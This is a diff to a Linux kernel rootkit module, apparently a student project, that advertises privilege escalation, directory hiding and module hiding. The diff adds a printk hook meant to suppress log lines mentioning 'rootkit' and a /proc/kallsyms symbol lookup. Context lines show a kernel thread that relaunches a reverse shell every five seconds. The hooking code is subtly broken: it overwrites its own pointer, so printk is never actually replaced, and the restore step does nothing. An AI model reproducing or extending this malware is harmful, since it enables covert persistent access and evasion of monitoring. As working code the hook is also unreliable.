@@ -27,6 +27,9 @@ MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
 MODULE_DESCRIPTION("Rootkit -> Privilege escalation, hiding directory, and LKM hiding");
 MODULE_VERSION("0.01");
 
+//clear logs 
+static asmlinkage int (*original_printk)(const char *fmt, ...);
+
 // Function prototypes
 void showme(void);
 void hideme(void);
@@ -307,16 +310,81 @@ static int lauch_sh_function(void *data) {
     //lauch revshell
     while (!kthread_should_stop()) {
         ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
-        // Rechercher le PID du script
-        revshell_pid = find_pid_by_name("bash");
-        if (revshell_pid > 0) {
-            //call the hide_process function here
-        }
         ssleep(5);
     }
 
     return 0;
 }
+
+static void *find_symbol(const char *name)
+{
+    struct file *file;
+    char *buffer, *line;
+    loff_t pos = 0;
+    ssize_t nbytes;
+
+    // Augmentation de la taille du buffer pour gérer des lignes longues
+    buffer = kmalloc(4096, GFP_KERNEL);
+    if (!buffer) {
+        return NULL;
+    }
+
+    file = filp_open("/proc/kallsyms", O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        kfree(buffer);
+        return NULL;
+    }
+
+    while ((nbytes = kernel_read(file, buffer, 4096, &pos)) > 0) {
+        line = strsep(&buffer, "\n");
+        while (line) {
+            unsigned long addr;
+            char sym_name[128];
+
+            if (sscanf(line, "%lx %*c %127s", &addr, sym_name) == 2) {
+                if (strcmp(sym_name, name) == 0) {
+                    filp_close(file, NULL);
+                    kfree(buffer);
+                    return (void *)addr;
+                }
+            }
+            line = strsep(&buffer, "\n");
+        }
+    }
+
+    filp_close(file, NULL);
+    kfree(buffer);
+    return NULL;
+}
+
+
+static asmlinkage int hooked_printk(const char *fmt, ...)
+{
+    va_list args;
+    int len;
+    char *buffer;
+
+    buffer = kmalloc(1024, GFP_KERNEL);
+    if (!buffer) {
+        return -ENOMEM;
+    }
+
+    va_start(args, fmt);
+    len = vsnprintf(buffer, 1024, fmt, args);
+    va_end(args);
+
+    // Filtrer les messages contenant "rootkit"
+    if (strstr(buffer, "rootkit")) {
+        kfree(buffer);
+        return 0;
+    }
+
+    // Appeler la fonction printk originale
+    len = original_printk("%s", buffer);
+    kfree(buffer);
+    return len;
+}
+
 
 // Module initialization and cleanup
 static int __init rootkit_init(void)
@@ -354,6 +422,18 @@ static int __init rootkit_init(void)
         return ret;
     }
 
+    original_printk = (void *)find_symbol("printk");
+    if (!original_printk) {
+        printk(KERN_ERR "Rootkit: Impossible de trouver printk.\n");
+        return -EFAULT;
+    }
+
+    // Remplace printk par le hook
+    *((void **)&original_printk) = hooked_printk;
+    printk(KERN_INFO "Rootkit: Hook de printk activé.\n");
+
+
+
     return 0;
 }
 
@@ -368,6 +448,11 @@ static void __exit rootkit_exit(void)
     // Unregister kprobes
     unregister_kprobe(&kp_getuid);
     unregister_kprobe(&kp_filldir64);
+
+    if (original_printk) {
+        *((void **)&original_printk) = original_printk;
+        printk(KERN_INFO "Rootkit: Hook de printk désactivé.\n");
+    }    
 
     // Show LKM
     showme();
